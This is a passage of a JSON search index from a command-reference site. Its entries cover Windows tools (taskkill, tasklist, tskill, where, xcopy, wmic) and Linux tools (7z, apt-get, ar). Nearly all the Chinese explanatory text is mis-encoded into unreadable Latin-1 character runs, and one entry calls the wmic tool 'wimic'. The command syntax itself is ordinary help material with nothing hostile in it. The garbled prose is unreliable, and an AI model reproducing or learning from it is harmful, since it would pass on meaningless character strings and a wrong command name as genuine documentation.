ç»ˆæ­¢æŒ‡å®šçš„è¿›ç¨‹å’Œç”±å®ƒå¯ç”¨çš„å­è¿›ç¨‹ã€‚ /F æŒ‡å®šå¼ºåˆ¶ç»ˆæ­¢è¿›ç¨‹ã€‚ /? æ˜¾ç¤ºå¸®åŠ©æ¶ˆæ¯ã€‚ ç­›é€‰å™¨ filter: ç­›é€‰å™¨å æœ‰æ•ˆè¿ç®—ç¬¦ æœ‰æ•ˆå€¼ ----------- --------------- ------------------------- STATUS eq, ne RUNNING | NOT RESPONDING | UNKNOWN IMAGENAME eq, ne æ˜ åƒåç§° PID eq, ne, gt, lt, ge, le PID å€¼ SESSION eq, ne, gt, lt, ge, le ä¼šè¯ç¼–å·ã€‚ CPUTIME eq, ne, gt, lt, ge, le CPU æ—¶é—´ï¼Œæ ¼å¼ä¸º hh:mm:ssã€‚ hh - æ—¶ï¼Œ mm - åˆ†ï¼Œss - ç§’ MEMUSAGE eq, ne, gt, lt, ge, le å†…å­˜ä½¿ç”¨é‡ï¼Œå•ä½ä¸º KB USERNAME eq, ne ç”¨æˆ·åï¼Œæ ¼å¼ä¸º [domain\\]user MODULES eq, ne DLL åç§° SERVICES eq, ne æœåŠ¡åç§° WINDOWTITLE eq, ne çª—å£æ ‡é¢˜ è¯´æ˜ ---- 1) åªæœ‰åœ¨åº”ç”¨ç­›é€‰å™¨çš„æƒ…å†µä¸‹ï¼Œ/IM åˆ‡æ¢æ‰èƒ½ä½¿ç”¨é€šé…ç¬¦ '*'ã€‚ 2) è¿œç¨‹è¿›ç¨‹æ€»æ˜¯è¦å¼ºè¡Œ (/F) ç»ˆæ­¢ã€‚ 3) å½“æŒ‡å®šè¿œç¨‹æœºå™¨æ—¶ï¼Œä¸æ”¯æŒ \"WINDOWTITLE\" å’Œ \"STATUS\" ç­›é€‰å™¨ã€‚ ä¾‹å¦‚: TASKKILL /IM notepad.exe TASKKILL /PID 1230 /PID 1241 /PID 1253 /T TASKKILL /F /IM cmd.exe /T TASKKILL /F /FI \"PID ge 1000\" /FI \"WINDOWTITLE ne untitle*\" TASKKILL /F /FI \"USERNAME eq NT AUTHORITY\\SYSTEM\" /IM notepad.exe TASKKILL /S system /U åŸŸ\\ç”¨æˆ·å /FI \"ç”¨æˆ·å ne NT*\" /IM * TASKKILL /S system /U username /P password /FI \"IMAGENAME eq note*\" å¼ºåˆ¶ç»ˆæ­¢æ‰æŒ‡å®šåç§°çš„è¿›ç¨‹ (/IMè¡¨ç¤ºè¿›ç¨‹å, /Få¼ºåˆ¶ç»ˆæ­¢): taskkill /IM process_name.exe /F","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-taskkill.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-taskkill.html"},{"title":"tasklist","text":"æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹, æƒ³æ‰¾ç±»ä¼¼ä¸linuxä¸‹ ps æ—¶æ‰¾åˆ°çš„: PS C:\\Users\\yanque> tasklist æ˜ åƒåç§° PID ä¼šè¯å ä¼šè¯# å†…å­˜ä½¿ç”¨ ========================= ======== ================ =========== ============ System Idle Process 0 Services 0 8 K System 4 Services 0 3,568 K Registry 268 Services 0 55,028 K smss.exe 936 Services 0 1,032 K csrss.exe 1212 Services 0 6,520 K wininit.exe 1312 Services 0 6,996 K services.exe 1384 Services 0 10,852 K lsass.exe 1408 Services 0 28,764 K svchost.exe 1528 Services 0 31,748 K fontdrvhost.exe 1556 Services 0 2,976 K æŸ¥çœ‹å¸®åŠ©: C:\\Users\\çƒŸé›€>tasklist /? è¯­æ³•: TASKLIST [/S system [/U username [/P [password]]]] [/M [module] | /SVC | /V] [/FI filter] [/FO format] [/NH] æè¿°: è¯¥å·¥å…·æ˜¾ç¤ºåœ¨æœ¬åœ°æˆ–è¿œç¨‹æœºå™¨ä¸Šå½“å‰è¿è¡Œçš„è¿›ç¨‹åˆ—è¡¨ã€‚ å‚æ•°åˆ—è¡¨: /S system æŒ‡å®šè¿æ¥åˆ°çš„è¿œç¨‹ç³»ç»Ÿã€‚ /U [domain]user æŒ‡å®šåº”è¯¥åœ¨å“ªä¸ªç”¨æˆ·ä¸Šä¸‹æ–‡æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ã€‚ /P [password] ä¸ºæä¾›çš„ç”¨æˆ·ä¸Šä¸‹æ–‡æŒ‡å®šå¯†ç ã€‚å¦‚æœçœç•¥ï¼Œåˆ™ æç¤ºè¾“å…¥ã€‚ /M [module] åˆ—å‡ºå½“å‰ä½¿ç”¨æ‰€ç»™ exe/dll åç§°çš„æ‰€æœ‰ä»»åŠ¡ã€‚ å¦‚æœæ²¡æœ‰æŒ‡å®šæ¨¡å—åç§°ï¼Œæ˜¾ç¤ºæ‰€æœ‰åŠ è½½çš„æ¨¡å—ã€‚ /SVC æ˜¾ç¤ºæ¯ä¸ªè¿›ç¨‹ä¸­ä¸»æŒçš„æœåŠ¡ã€‚ /APPS æ˜¾ç¤º Microsoft Store åº”ç”¨åŠå…¶å…³è”çš„è¿›ç¨‹ã€‚ /V æ˜¾ç¤ºè¯¦ç»†ä»»åŠ¡ä¿¡æ¯ã€‚ /FI filter æ˜¾ç¤ºä¸€ç³»åˆ—ç¬¦åˆç­›é€‰å™¨ æŒ‡å®šæ¡ä»¶çš„ä»»åŠ¡ã€‚ /FO format æŒ‡å®šè¾“å‡ºæ ¼å¼ã€‚ æœ‰æ•ˆå€¼: \"TABLE\"ã€\"LIST\"ã€\"CSV\"ã€‚ /NH æŒ‡å®šåˆ—æ ‡é¢˜ä¸åº”è¯¥ åœ¨è¾“å‡ºä¸­æ˜¾ç¤ºã€‚ åªå¯¹ \"TABLE\" å’Œ \"CSV\" æ ¼å¼æœ‰æ•ˆã€‚ /? æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯ã€‚ ç­›é€‰å™¨: ç­›é€‰å™¨åç§° æœ‰æ•ˆè¿ç®—ç¬¦ æœ‰æ•ˆå€¼ ----------- --------------- -------------------------- STATUS eq, ne RUNNING | SUSPENDED NOT RESPONDING | UNKNOWN IMAGENAME eq, ne æ˜ åƒåç§° PID eq, ne, gt, lt, ge, le PID å€¼ SESSION eq, ne, gt, lt, ge, le ä¼šè¯ç¼–å· SESSIONNAME eq, ne ä¼šè¯åç§° CPUTIME eq, ne, gt, lt, ge, le CPU æ—¶é—´ï¼Œæ ¼å¼ä¸º hh:mm:ssã€‚ hh - å°æ—¶ï¼Œ mm - åˆ†é’Ÿï¼Œss - ç§’ MEMUSAGE eq, ne, gt, lt, ge, le å†…å­˜ä½¿ç”¨(ä»¥ KB ä¸ºå•ä½) USERNAME eq, ne ç”¨æˆ·åï¼Œæ ¼å¼ä¸º [åŸŸ\\]ç”¨æˆ· SERVICES eq, ne æœåŠ¡åç§° WINDOWTITLE eq, ne çª—å£æ ‡é¢˜ æ¨¡å— eq, ne DLL åç§° æ³¨æ„: å½“æŸ¥è¯¢è¿œç¨‹è®¡ç®—æœºæ—¶ï¼Œä¸æ”¯æŒ \"WINDOWTITLE\" å’Œ \"STATUS\" ç­›é€‰å™¨ã€‚ Examples: TASKLIST TASKLIST /M TASKLIST /V /FO CSV TASKLIST /SVC /FO LIST TASKLIST /APPS /FI \"STATUS eq RUNNING\" TASKLIST /M wbem* TASKLIST /S system /FO LIST TASKLIST /S system /U åŸŸ\\ç”¨æˆ·å /FO CSV /NH TASKLIST /S system /U username /P password /FO TABLE /NH TASKLIST /FI \"USERNAME ne NT AUTHORITY\\SYSTEM\" /FI \"STATUS eq running\"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-tasklist.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-tasklist.html"},{"title":"title","text":"è¯­æ³•: title [string] è¡¨ç¤ºè®¾ç½® cmd çª—å£çš„æ ‡é¢˜ä¸º string","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-title.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-title.html"},{"title":"tskill","text":"ç±»ä¼¼ linux çš„ kill, ä½é…ç‰ˆçš„ /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/taskkill ç»“æŸè¿›ç¨‹: TSKILL processid | processname [/SERVER:servername] [/ID:sessionid | /A] [/V] processid è¦ç»“æŸçš„è¿›ç¨‹çš„ Process IDã€‚ processname è¦ç»“æŸçš„è¿›ç¨‹åç§°ã€‚ /SERVER:servername å«æœ‰ processID çš„æœåŠ¡å™¨(é»˜è®¤å€¼æ˜¯å½“å‰å€¼)ã€‚ ä½¿ç”¨è¿›ç¨‹åå’Œ /SERVER æ—¶ï¼Œå¿…é¡»æŒ‡å®š /ID æˆ– /A /ID:sessionid ç»“æŸåœ¨æŒ‡å®šä¼šè¯ä¸‹è¿è¡Œçš„è¿›ç¨‹ã€‚ /A ç»“æŸåœ¨æ‰€æœ‰ä¼šè¯ä¸‹è¿è¡Œçš„è¿›ç¨‹ã€‚ /V æ˜¾ç¤ºæ­£åœ¨æ‰§è¡Œçš„æ“ä½œçš„ä¿¡æ¯ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-tskill.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-tskill.html"},{"title":"where","text":"æ˜¾ç¤ºç¬¦åˆæœç´¢æ¨¡å¼çš„æ–‡ä»¶ä½ç½®ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œæœç´¢æ˜¯åœ¨å½“å‰ç›®å½•å’Œ PATH ç¯å¢ƒå˜é‡æŒ‡å®šçš„è·¯å¾„ä¸­æ‰§è¡Œçš„ è¯­æ³•: WHERE [/R dir] [/Q] [/F] [/T] pattern... å‚æ•°åˆ—è¡¨: /R ä»æŒ‡å®šç›®å½•å¼€å§‹ï¼Œé€’å½’æ€§æœç´¢å¹¶æ˜¾ç¤ºç¬¦åˆæŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶ã€‚ /Q åªè¿”å›é€€å‡ºä»£ç ï¼Œä¸æ˜¾ç¤ºåŒ¹é…æ–‡ä»¶åˆ—è¡¨ã€‚(å®‰é™æ¨¡å¼) åŒ¹é…æ–‡ä»¶ã€‚(å®‰é™æ¨¡å¼) /F æ˜¾ç¤ºæ‰€æœ‰ç›¸é…æ–‡ä»¶å¹¶ç”¨åŒå¼•å·æ‹¬ä¸Šã€‚ /T æ˜¾ç¤ºæ‰€æœ‰ç›¸é…æ–‡ä»¶çš„æ–‡ä»¶çš„æ–‡ä»¶ã€‚ pattern æŒ‡å®šè¦åŒ¹é…çš„æ–‡ä»¶çš„æœç´¢æ¨¡å¼ã€‚é€šé…ç¬¦ * å’Œ ? å¯ä»¥ç”¨åœ¨æ¨¡å¼ä¸­ã€‚ ä¹Ÿå¯ä»¥æŒ‡å®š \"$env:pattern\" å’Œ \"path:pattern\" æ ¼å¼; å…¶ä¸­ \"env\" æ˜¯ç¯å¢ƒå˜é‡ï¼Œæœç´¢æ˜¯åœ¨ \"env\" å˜é‡çš„æŒ‡å®šçš„è·¯å¾„ä¸­æ‰§è¡Œçš„ã€‚ è¿™äº›æ ¼å¼ä¸åº”è¯¥è·Ÿ /R ä¸€èµ·ä½¿ç”¨ã€‚æ­¤æœç´¢ä¹Ÿå¯ä»¥ç”¨å°† PATHEXT å˜ é‡æ‰©å±•åé™„åŠ äºæ­¤æ¨¡å¼çš„æ–¹å¼å®Œæˆã€‚ /? æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯ã€‚ æ³¨æ„: å¦‚æœæœç´¢æˆåŠŸï¼Œæ­¤å·¥å…·è¿”å›é”™è¯¯çº§åˆ« 0; å¦‚æœä¸æˆåŠŸï¼Œè¿”å› 1; å¦‚æœå¤±è´¥æˆ–å‘ç”Ÿé”™è¯¯ï¼Œè¿”å› 2ã€‚ ç¤ºä¾‹: WHERE /? WHERE myfilename1 myfile????.* WHERE $windir:*.* WHERE /R c:\\windows *.exe *.dll *.bat WHERE /Q ??.??? WHERE \"c:\\windows;c:\\windows\\system32:*.dll\" WHERE /F /T *.dll","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-where.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-where.html"},{"title":"wimic","text":"windowsä¸‹çš„ä¸€ä¸ªäº¤äº’å¼çš„å‘½ä»¤è¡Œç¯å¢ƒ(ç±»ä¼¼bash shellä¹‹ç±») å¸®åŠ©ç”¨æ³•å¦‚ä¸‹ï¼š å‘½ä»¤è¡Œå¸®åŠ© å‘½ä»¤ ä¾‹å­ è¯´æ˜ /? æˆ– -? æ˜¾ç¤ºæ‰€æœ‰å…¨å±€å¼€å…³å’Œåˆ«åçš„è¯­æ³• /? class /? æ˜¾ç¤ºæŸä¸ªå‘½ä»¤çš„ä¿¡æ¯ /? memcache /? æ˜¾ç¤ºæŸä¸ªåˆ«åçš„ä¿¡æ¯ /? temperature get /? æ˜¾ç¤ºåˆ«åä¸åŠ¨è¯ç»„åˆçš„ä¿¡æ¯ /?:Full irq get /?:Full æ˜¾ç¤ºåŠ¨è¯çš„å¸®åŠ©ä¿¡æ¯ å¸¸ç”¨çš„ æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹: wimic process","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-wimic.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-wimic.html"},{"title":"xcopy","text":"å¤åˆ¶æ–‡ä»¶å’Œç›®å½•æ ‘: XCOPY source [destination] [/A | /M] [/D[:date]] [/P] [/S [/E]] [/V] [/W] [/C] [/I] [/Q] [/F] [/L] [/G] [/H] [/R] [/T] [/U] [/K] [/N] [/O] [/X] [/Y] [/-Y] [/Z] [/B] [/J] [/EXCLUDE:file1[+file2][+file3]...] [/COMPRESS] source æŒ‡å®šè¦å¤åˆ¶çš„æ–‡ä»¶ã€‚ destination æŒ‡å®šæ–°æ–‡ä»¶çš„ä½ç½®å’Œ/æˆ–åç§°ã€‚ /A ä»…å¤åˆ¶æœ‰å­˜æ¡£å±æ€§é›†çš„æ–‡ä»¶ï¼Œ ä½†ä¸æ›´æ”¹å±æ€§ã€‚ /M ä»…å¤åˆ¶æœ‰å­˜æ¡£å±æ€§é›†çš„æ–‡ä»¶ï¼Œ å¹¶å…³é—­å­˜æ¡£å±æ€§ã€‚ /D:m-d-y å¤åˆ¶åœ¨æŒ‡å®šæ—¥æœŸæˆ–æŒ‡å®šæ—¥æœŸä»¥åæ›´æ”¹çš„æ–‡ä»¶ã€‚ å¦‚æœæ²¡æœ‰æä¾›æ—¥æœŸï¼Œåˆ™åªå¤åˆ¶æºæ—¶é—´æ¯”ç›®æ ‡æ—¶é—´æ–°çš„æ–‡ä»¶ã€‚ /EXCLUDE:file1[+file2][+file3]... æŒ‡å®šå«æœ‰å­—ç¬¦ä¸²çš„æ–‡ä»¶åˆ—è¡¨ã€‚æ¯ä¸ªå­—ç¬¦ä¸² åœ¨æ–‡ä»¶ä¸­åº”ä½äºå•ç‹¬çš„ä¸€è¡Œã€‚å¦‚æœä»»ä½• å­—ç¬¦ä¸²ä¸å¤åˆ¶æ–‡ä»¶çš„ç»å¯¹è·¯å¾„çš„ä»»ä½•éƒ¨åˆ†ç›¸ç¬¦ï¼Œ åˆ™æ’é™¤å¤åˆ¶è¯¥æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œ æŒ‡å®šå¦‚ \\obj\\ æˆ– .obj çš„å­—ç¬¦ä¸²ä¼šåˆ†åˆ« æ’é™¤ç›®å½• obj ä¸‹é¢çš„æ‰€æœ‰æ–‡ä»¶æˆ–å¸¦æœ‰ .obj æ‰©å±•åçš„æ‰€æœ‰æ–‡ä»¶ã€‚ /P åˆ›å»ºæ¯ä¸ªç›®æ ‡æ–‡ä»¶ä¹‹å‰å‡è¿›è¡Œæç¤ºã€‚ /S å¤åˆ¶ç›®å½•å’Œå­ç›®å½•ï¼Œä¸åŒ…æ‹¬ç©ºç›®å½•ã€‚ /E å¤åˆ¶ç›®å½•å’Œå­ç›®å½•ï¼ŒåŒ…æ‹¬ç©ºç›®å½•ã€‚ ä¸ /S /E ç›¸åŒã€‚å¯ä»¥ç”¨æ¥ä¿®æ”¹ /Tã€‚ /V éªŒè¯æ¯ä¸ªæ–°æ–‡ä»¶çš„å¤§å°ã€‚ /W æç¤ºåœ¨å¤åˆ¶å‰æŒ‰é”®ã€‚ /C å³ä½¿æœ‰é”™è¯¯ï¼Œä¹Ÿç»§ç»­å¤åˆ¶ã€‚ /I å¦‚æœç›®æ ‡ä¸å­˜åœ¨ï¼Œä¸”è¦å¤åˆ¶å¤šä¸ªæ–‡ä»¶ï¼Œ åˆ™å‡å®šç›®æ ‡å¿…é¡»æ˜¯ç›®å½•ã€‚ /Q å¤åˆ¶æ—¶ä¸æ˜¾ç¤ºæ–‡ä»¶åã€‚ /F å¤åˆ¶æ—¶æ˜¾ç¤ºå®Œæ•´çš„æºæ–‡ä»¶åå’Œç›®æ ‡æ–‡ä»¶åã€‚ /L æ˜¾ç¤ºè¦å¤åˆ¶çš„æ–‡ä»¶ã€‚ /G å…è®¸å°†åŠ å¯†æ–‡ä»¶å¤åˆ¶åˆ° ä¸æ”¯æŒåŠ å¯†çš„ç›®æ ‡ã€‚ /H éšè—æ–‡ä»¶å’Œç³»ç»Ÿæ–‡ä»¶ä¹Ÿä¼šå¤åˆ¶ã€‚ /R è¦†ç›–åªè¯»æ–‡ä»¶ã€‚ /T åˆ›å»ºç›®å½•ç»“æ„ï¼Œä½†ä¸å¤åˆ¶æ–‡ä»¶ã€‚ä¸ åŒ…æ‹¬ç©ºç›®å½•æˆ–å­ç›®å½•ã€‚/T /E åŒ…æ‹¬ ç©ºç›®å½•å’Œå­ç›®å½•ã€‚ /U åªå¤åˆ¶å·²ç»å­˜åœ¨äºç›®æ ‡ä¸­çš„æ–‡ä»¶ã€‚ /K å¤åˆ¶å±æ€§ã€‚ä¸€èˆ¬çš„ Xcopy ä¼šé‡ç½®åªè¯»å±æ€§ã€‚ /N ç”¨ç”Ÿæˆçš„çŸ­åç§°å¤åˆ¶ã€‚ /O å¤åˆ¶æ–‡ä»¶æ‰€æœ‰æƒå’Œ ACL ä¿¡æ¯ã€‚ /X å¤åˆ¶æ–‡ä»¶å®¡æ ¸è®¾ç½®(éšå« /O)ã€‚ /Y å–æ¶ˆæç¤ºä»¥ç¡®è®¤è¦è¦†ç›– ç°æœ‰ç›®æ ‡æ–‡ä»¶ã€‚ /-Y è§¦å‘æç¤ºï¼Œä»¥ç¡®è®¤è¦è¦†ç›– ç°æœ‰ç›®æ ‡æ–‡ä»¶ã€‚ /Z åœ¨å¯é‡æ–°å¯åŠ¨æ¨¡å¼ä¸‹å¤åˆ¶ç½‘ç»œæ–‡ä»¶ã€‚ /B å¤åˆ¶ç¬¦å·é“¾æ¥æœ¬èº«ä¸é“¾æ¥ç›®æ ‡ã€‚ /J å¤åˆ¶æ—¶ä¸ä½¿ç”¨ç¼“å†²çš„ I/Oã€‚æ¨èå¤åˆ¶å¤§æ–‡ä»¶æ—¶ä½¿ç”¨ã€‚ /COMPRESS å¦‚æœé€‚ç”¨ï¼Œåœ¨ä¼ è¾“æœŸé—´è¯·æ±‚ç½‘ç»œ å‹ç¼©ã€‚ å¼€å…³ /Y å¯ä»¥é¢„å…ˆåœ¨ COPYCMD ç¯å¢ƒå˜é‡ä¸­è®¾ç½®ã€‚ è¿™å¯èƒ½è¢«å‘½ä»¤è¡Œä¸Šçš„ /-Y è¦†ç›–ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-xcopy.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-xcopy.html"},{"title":"7z","text":"ä½ç‰ˆæœ¬ç³»ç»Ÿå¯èƒ½éå†…ç½®æŒ‡ä»¤, éœ€è¦æ‰‹åŠ¨å®‰è£…: apt install p7zip è¯­æ³•: 7z <command> [<switches>...] <archive_name> [<file_names>...][<@listfiles...>] æ”¯æŒå‘½ä»¤(command): a : Add files to archive b : Benchmark d : Delete files from archive e : Extract files from archive (without using directory names) h : Calculate hash values for files i : Show information about supported formats l : List contents of archive rn : Rename files in archive t : Test integrity of archive u : Update files to archive x : eXtract files with full paths é€‰é¡¹å‚æ•° -r è¡¨ç¤ºé€’å½’è§£å‹ç¼©æ‰€æœ‰çš„å­æ–‡ä»¶å¤¹ -t <Type> æŒ‡å®šå‹ç¼©ç±»å‹, é»˜è®¤7zã€‚ -o <Directory> è®¾ç½®è§£å‹åˆ°çš„ç›®å½• -p <Password> è®¾ç½®è§£å‹ç¼©å¯†ç  è§£å‹, ä¾‹: 7z x xxx.7z","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-7.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-7.html"},{"title":"apt-get","text":"æ”¯æŒçš„command è¯­æ³•: apt-get <command> [options] [packages] update - å–å›æ›´æ–°çš„è½¯ä»¶åŒ…åˆ—è¡¨ä¿¡æ¯ upgrade - è¿›è¡Œä¸€æ¬¡å‡çº§ install - å®‰è£…æ–°çš„è½¯ä»¶åŒ…(æ³¨ï¼šè½¯ä»¶åŒ…åç§°æ˜¯ libc6 è€Œé libc6.deb) remove - å¸è½½è½¯ä»¶åŒ… autoremove - å¸è½½æ‰€æœ‰è‡ªåŠ¨å®‰è£…ä¸”ä¸å†ä½¿ç”¨çš„è½¯ä»¶åŒ… purge - å¸è½½å¹¶æ¸…é™¤è½¯ä»¶åŒ…çš„é…ç½® source - ä¸‹è½½æºç åŒ…æ–‡ä»¶ build-dep - ä¸ºæºç åŒ…é…ç½®æ‰€éœ€çš„ç¼–è¯‘ä¾èµ–å…³ç³» dist-upgrade - å‘å¸ƒç‰ˆå‡çº§ï¼Œè§ apt-get(8) dselect-upgrade - æ ¹æ® dselect çš„é€‰æ‹©æ¥è¿›è¡Œå‡çº§ clean - åˆ é™¤æ‰€æœ‰å·²ä¸‹è½½çš„åŒ…æ–‡ä»¶ autoclean - åˆ é™¤å·²ä¸‹è½½çš„æ—§åŒ…æ–‡ä»¶ check - æ ¸å¯¹ä»¥ç¡®è®¤ç³»ç»Ÿçš„ä¾èµ–å…³ç³»çš„å®Œæ•´æ€§ changelog - ä¸‹è½½æŒ‡å®šè½¯ä»¶åŒ…ï¼Œå¹¶æ˜¾ç¤ºå…¶changelog download - ä¸‹è½½æŒ‡å®šçš„äºŒè¿›åˆ¶åŒ…åˆ°å½“å‰ç›®å½• é€‰é¡¹å‚æ•° -h æœ¬å¸®åŠ©æ–‡æ¡£ã€‚ -q è®©è¾“å‡ºå¯ä½œä¸ºæ—¥å¿— - ä¸æ˜¾ç¤ºè¿›åº¦ -q q é™¤äº†é”™è¯¯å¤–ï¼Œä»€ä¹ˆéƒ½ä¸è¾“å‡º -d ä»…ä»…ä¸‹è½½ - ã€ä¸ã€‘å®‰è£…æˆ–è§£å¼€åŒ…æ–‡ä»¶ -s ä¸ä½œå®é™…æ“ä½œã€‚åªæ˜¯ä¾æ¬¡æ¨¡æ‹Ÿæ‰§è¡Œå‘½ä»¤ -y å¯¹æ‰€æœ‰è¯¢é—®éƒ½å›ç­”æ˜¯(Yes)ï¼ŒåŒæ—¶ä¸ä½œä»»ä½•æç¤º -f å½“å‡ºç°ç ´æŸçš„ä¾èµ–å…³ç³»æ—¶ï¼Œç¨‹åºå°†å°è¯•ä¿®æ­£ç³»ç»Ÿ -m å½“æœ‰åŒ…æ–‡ä»¶æ— æ³•æ‰¾åˆ°æ—¶ï¼Œç¨‹åºä»å°è¯•ç»§ç»­æ‰§è¡Œ -u æ˜¾ç¤ºå·²å‡çº§çš„è½¯ä»¶åŒ…åˆ—è¡¨ -b åœ¨ä¸‹è½½å®Œæºç åŒ…åï¼Œç¼–è¯‘ç”Ÿæˆç›¸åº”çš„è½¯ä»¶åŒ… -V æ˜¾ç¤ºè¯¦å°½çš„ç‰ˆæœ¬å· -c <config> è¯»å–æŒ‡å®šé…ç½®æ–‡ä»¶ -o <config> è®¾ç½®ä»»æ„æŒ‡å®šçš„é…ç½®é€‰é¡¹ï¼Œä¾‹å¦‚ -o dir::cache=/tmp æ¨¡æ‹Ÿå®‰è£…: apt-get install -s $soft","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-APT-get.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-APT-get.html"},{"title":"ar","text":"Linux arå‘½ä»¤ç”¨äºå»ºç«‹æˆ–ä¿®æ”¹å¤‡å­˜æ–‡ä»¶ï¼Œæˆ–æ˜¯ä»å¤‡å­˜æ–‡ä»¶ä¸­æŠ½å–æ–‡ä»¶ã€‚ arå¯è®©æ‚¨é›†åˆè®¸å¤šæ–‡ä»¶ï¼Œæˆä¸ºå•ä¸€çš„å¤‡å­˜æ–‡ä»¶ã€‚åœ¨å¤‡å­˜æ–‡ä»¶ä¸­ï¼Œæ‰€æœ‰æˆå‘˜æ–‡ä»¶çš†ä¿æœ‰åŸæ¥çš„å±æ€§ä¸æƒé™ã€‚ å½“æˆ‘ä»¬çš„ç¨‹åºä¸­æœ‰ç»å¸¸ä½¿ç”¨çš„æ¨¡å—ï¼Œè€Œä¸”è¿™ç§æ¨¡å—åœ¨å…¶ä»–ç¨‹åºä¸­ä¹Ÿä¼šç”¨åˆ°ï¼Œ è¿™æ—¶æŒ‰ç…§è½¯ä»¶é‡ç”¨çš„æ€æƒ³ï¼Œæˆ‘ä»¬åº”è¯¥å°†å®ƒä»¬ç”Ÿæˆåº“ï¼Œä½¿å¾—ä»¥åç¼–ç¨‹å¯ä»¥å‡å°‘å¼€å‘ä»£ç é‡ã€‚ arå‘½ä»¤å¯ä»¥ç”¨æ¥åˆ›å»ºã€ä¿®æ”¹åº“ï¼Œä¹Ÿå¯ä»¥ä»åº“ä¸­æå‡ºå•ä¸ªæ¨¡å—ã€‚ åº“æ˜¯ä¸€å•ç‹¬çš„æ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«äº†æŒ‰ç…§ç‰¹å®šçš„ç»“æ„ç»„ç»‡èµ·æ¥çš„å…¶å®ƒçš„ä¸€äº›æ–‡ä»¶ï¼ˆç§°åšæ­¤åº“æ–‡ä»¶çš„memberï¼‰ã€‚ åŸå§‹æ–‡ä»¶çš„å†…å®¹ã€æ¨¡å¼ã€æ—¶é—´æˆ³ã€å±ä¸»ã€ç»„ç­‰å±æ€§éƒ½ä¿ç•™åœ¨åº“æ–‡ä»¶ä¸­ã€‚ è¯­æ³•: ar[-dmpqrtx][cfosSuvV][a<æˆå‘˜æ–‡ä»¶>][b<æˆå‘˜æ–‡ä»¶>][i<æˆå‘˜æ–‡ä»¶>][å¤‡å­˜æ–‡ä»¶][æˆå‘˜æ–‡ä»¶] å‚æ•° å¿…è¦å‚æ•°ï¼š -d åˆ é™¤å¤‡å­˜æ–‡ä»¶ä¸­çš„æˆå‘˜æ–‡ä»¶ã€‚ -m å˜æ›´æˆå‘˜æ–‡ä»¶åœ¨å¤‡å­˜æ–‡ä»¶ä¸­çš„æ¬¡åºã€‚ -p æ˜¾ç¤ºå¤‡å­˜æ–‡ä»¶ä¸­çš„æˆå‘˜æ–‡ä»¶å†…å®¹ã€‚ -q å°†æ–‡ä»¶é™„åŠ åœ¨å¤‡å­˜æ–‡ä»¶æœ«ç«¯ã€‚ -r å°†æ–‡ä»¶æ’å…¥å¤‡å­˜æ–‡ä»¶ä¸­ã€‚ -t æ˜¾ç¤ºå¤‡å­˜æ–‡ä»¶ä¸­æ‰€åŒ…å«çš„æ–‡ä»¶ã€‚ -x è‡ªå¤‡å­˜æ–‡ä»¶ä¸­å–å‡ºæˆå‘˜æ–‡ä»¶ã€‚ é€‰é¡¹å‚æ•°ï¼š a<æˆå‘˜æ–‡ä»¶> å°†æ–‡ä»¶æ’å…¥å¤‡å­˜æ–‡ä»¶ä¸­æŒ‡å®šçš„æˆå‘˜æ–‡ä»¶ä¹‹åã€‚ b<æˆå‘˜æ–‡ä»¶> å°†æ–‡ä»¶æ’å…¥å¤‡å­˜æ–‡ä»¶ä¸­æŒ‡å®šçš„æˆå‘˜æ–‡ä»¶ä¹‹å‰ã€‚ c å»ºç«‹å¤‡å­˜æ–‡ä»¶ã€‚ f ä¸ºé¿å…è¿‡é•¿çš„æ–‡ä»¶åä¸å…¼å®¹äºå…¶ä»–ç³»ç»Ÿçš„aræŒ‡ä»¤æŒ‡ä»¤ï¼Œå› æ­¤å¯åˆ©ç”¨æ­¤å‚æ•°ï¼Œæˆªæ‰è¦æ”¾å…¥å¤‡å­˜æ–‡ä»¶ä¸­è¿‡é•¿çš„æˆå‘˜æ–‡ä»¶åç§°ã€‚ i<æˆå‘˜æ–‡ä»¶> å°†æ–‡ä»¶æ’å…¥å¤‡å­˜æ–‡ä»¶ä¸­æŒ‡å®šçš„æˆå‘˜æ–‡ä»¶ä¹‹å‰ã€‚ o ä¿ç•™å¤‡å­˜æ–‡ä»¶ä¸­æ–‡ä»¶çš„æ—¥æœŸã€‚ s è‹¥å¤‡å­˜æ–‡ä»¶ä¸­åŒ…å«äº†å¯¹è±¡æ¨¡å¼ï¼Œå¯åˆ©ç”¨æ­¤å‚æ•°å»ºç«‹å¤‡å­˜æ–‡ä»¶çš„ç¬¦å·è¡¨ã€‚ S ä¸äº§ç”Ÿç¬¦å·è¡¨ã€‚ u 